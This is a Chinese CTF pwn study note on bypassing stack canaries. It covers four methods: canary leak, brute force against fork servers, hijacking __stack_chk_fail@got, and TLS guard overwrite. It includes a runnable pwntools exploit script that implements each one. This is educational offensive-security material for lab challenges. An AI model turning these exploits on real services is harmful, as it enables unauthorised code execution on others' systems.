---
title: Canary 绕过四种打法（泄露 / 爆破 / __stack_chk_fail / TLS）
category: pwn
tags: [canary, 栈保护, 爆破, __stack_chk_fail, TLS]
signals: [checksec 显示 Canary found, 程序里出现 __stack_chk_fail, fork 服务且每次连接重启, 有 puts/printf 输出缓冲区, 溢出长度可控到 1 字节, fs:0x28 出现]
difficulty: medium
source: "CTF-Wiki Canary / ir0nstone Stack Canaries"
tools: [pwntools, gdb, pwndbg]
updated: 2026-10-22
requires: [pwn/checksec-and-basics.md]
---

## 一、识别信号（题面长什么样）

- `checksec` 报 `Canary found`，`objdump` 里能看到 `fs:0x28` 的读写。
- 二进制导入表中有 `__stack_chk_fail@plt`，函数尾部有 `xor rdx, fs:0x28; je ok; call __stack_chk_fail`。
- 题面强调「服务用 `fork` 实现」「每次连接 reset 但不重新 exec」——这是**爆破 canary** 的关键前提。
- 程序有 `printf(buf)` 或 `puts(buf)` 之后又读一次——可「先泄露再打」。
- 溢出可以**精确到 1 字节**（`read(0, buf, n+1)`），可覆盖 canary 的 `\x00` 低字节。

## 二、原理

GCC 在函数序言插入：

```asm
mov  rax, qword ptr fs:[0x28]     ; 从 TLS 读 canary
mov  qword ptr [rbp-0x8], rax     ; 存到栈上
...
mov  rdx, qword ptr [rbp-0x8]
xor  rdx, qword ptr fs:[0x28]     ; 与 TLS 比较
je   ok
call __stack_chk_fail
```

Canary 特性：
- 低字节固定为 `\x00`（`_dl_setup_stack_chk_guard` 把最低位清零），目的是截断字符串函数。
- 同一进程内所有线程、`fork` 出的子进程 canary **相同**（`fork` 复制内存）。
- 进程 `execve` 重启后 canary 会变（`_dl_random` 重新初始化）。

四条绕过路径：

| 打法 | 前提 | 原理 |
|---|---|---|
| 泄露 | 有输出函数且 canary 可被部分覆盖 | 覆盖低字节 `\x00` 为 `\n` 或其他，让 `puts` 一并输出剩余 7 字节 |
| 爆破 | 服务 `fork` 后复用父进程 | 子进程 canary 不变，逐字节试，错误则进程崩溃但不影响下一次 |
| 劫持 `__stack_chk_fail` | GOT 可写（Partial RELRO） | 把 `__stack_chk_fail@got` 改成 `win`/`system`，检测失败即跳转 |
| 覆盖 TLS | 溢出距离足够长 | 同时覆盖栈上 canary 与 `fs:0x28` 指向的 TLS 值，两者一致即通过 |

## 三、checksec 判读与利用思路

```text
RELRO: Partial  Canary: found  NX: enabled  PIE: disabled
```

决策树：

1. **有 `printf(buf)` / `puts(buf)` 且程序循环** → 走**泄露**（最稳）。
2. **只有一次输入、无输出** → 看 `fork`：`socat TCP-LISTEN:... fork exec:./pwn` 才是真 fork；可爆破。
3. **Partial RELRO + 能格式化字符串任意写** → 改 `__stack_chk_fail@got`，让 canary 检测失败变成 `system`。
4. **溢出距离 > 0x200 且 TLS 与栈偏移固定** → TLS 覆盖，但要先泄露 TLS 地址（`pthread` 或 `arch_prctl`）。
5. **有 `read` 但只能覆盖到 canary 低字节** → 泄露法；只能改 1 字节时用 `\x00` → `\n` 会截断，用 `\x01`~`\xff` 中非终止符。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE \
           else process()

OFFSET   = 0x40 + 8               # buf 大小 + 到 canary 的距离（实测）
SAVED_RBP = 8                     # canary 后到返回地址的距离
WIN      = elf.sym.get("getshell", elf.sym.get("win", 0xdeadbeef))

# ---------- 打法 1：泄露 canary ----------
def approach_leak():
    p = start()
    p.recvuntil(b"Hello Hacker!\n")
    # 用 0x40 个 'A' 填满 buf，第 65 字节把 canary 的 \x00 覆盖成非零可打印字节
    p.send(b"A" * OFFSET + b"!")
    p.recvuntil(b"A" * OFFSET + b"!")       # 跳过回显
    canary = b"\x00" + p.recvn(7)           # 低字节补回 \x00
    success(f"canary = {canary.hex()}")
    # 第二次溢出：带上 canary
    payload  = b"A" * OFFSET + canary
    payload += b"B" * SAVED_RBP
    payload += p64(WIN) if context.bits == 64 else p32(WIN)
    p.send(payload)
    p.interactive()

# ---------- 打法 2：fork 服务下逐字节爆破 ----------
def approach_bruteforce(max_try=200):
    canary = b"\x00"
    while len(canary) < 8:
        for guess in range(0x100):
            if len(canary) == 0 and guess != 0x00:
                continue                    # 首位必为 0x00
            p = start()
            payload  = b"A" * OFFSET + canary + bytes([guess])
            try:
                p.send(payload)
                # 若进程还活着（能继续交互 / 未 EOF），说明字节正确
                data = p.recv(timeout=0.5)
                p.close()
            except EOFError:
                p.close()
                continue
            if data is not None and b"Smashing" not in data:
                canary += bytes([guess])
                log.success(f"byte[{len(canary)-1}] = {guess:#04x}  -> {canary.hex()}")
                break
        else:
            log.failure("爆破失败，check是否真的 fork，或尝试量不足")
            return None
    return canary

# ---------- 打法 3：劫持 __stack_chk_fail@got（配合格式化字符串/任意写） ----------
def approach_chk_fail_got():
    """
    前提：已有任意写（如 %n）。把 __stack_chk_fail@got 写成 win。
    这样 canary 检测失败时 call __stack_chk_fail 直接跳到 win。
    """
    target = elf.got["__stack_chk_fail"]
    value  = WIN
    log.info(f"write {hex(value)} -> __stack_chk_fail@got {hex(target)}")
    # 构造 3 字节写（小端低位先写），配合 fmtstr_payload
    payload = fmtstr_payload(6, {target: value}, write_size="short")
    return payload

# ---------- 打法 4：覆盖 TLS 中保存的 canary ----------
def approach_tls(canary_leak, tls_off):
    """
    canary_leak: 已知 canary 8 字节
    tls_off    : 从 buf 到 fs:0x28 的偏移（通常 = OFFSET + 0x20 左右，需实测）
    让栈上 canary 与 TLS 值一致，检测自然通过。
    """
    payload  = b"A" * OFFSET + canary_leak
    payload  = payload.ljust(tls_off, b"\x00")
    payload += canary_leak          # 同时覆盖 TLS 中的 stack_guard
    payload  = payload.ljust(OFFSET + 3 * 8, b"\x00")   # 占位到返回地址
    payload += p64(WIN)
    return payload

if __name__ == "__main__":
    if args.BRUTE:
        canary = approach_bruteforce()
        print("canary =", canary.hex() if canary else None)
    else:
        approach_leak()
```

## 五、常见坑 / 变体

- **不是真 fork**：`socat ... exec:` 每次 exec 都会重置 canary；只有 `fork` 复用内存才能爆破（看 `checksec` 无关，看服务启动脚本）。
- **爆破判定不准**：靠「有没有收到 banner/是否 EOF」判断，`process()` 崩溃后 `recv` 返回 `b''`，要用 `recv(timeout=)` + 判断返回值。
- **泄露法被 `\x00` 卡住**：`puts` 遇 `\x00` 停，必须先把 canary 首字节覆盖成非零，且新字节不能是 `\n`（`gets`/`readline`）。
- **`%s` 类输出**：同理；用 `printf("%s")` 输出原始字节比 `puts` 更可靠。
- **`__stack_chk_fail@got` 不可写**：Full RELRO 下无效，退回到泄露或 TLS 覆盖。
- **`<stdio.h>` 的 `_IO_2_1_stdin_` 影响**：某些题目 canary 与 `fs:0x28` 之间有 0x10 空隙，偏移必须 gdb 精确数。
- **musl/Android**：无 `__stack_chk_fail` 延迟绑定语义，第 3 条打法不适用。

## 六、参考来源

- [CTF-Wiki: Canary 保护与绕过](https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/)
- [ir0nstone: Stack Canaries](https://ir0nstone.gitbook.io/notes/binexp/stack/canaries)
- [ir0nstone: 爆破与 fork 关系](https://ir0nstone.gitbook.io/notes/binexp/stack/forking-processes)
- [HackTricks: Common Binary Protections and Bypasses](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)
- [pwndbg（canary 可视化 / canary 命令）](https://github.com/pwndbg/pwndbg)
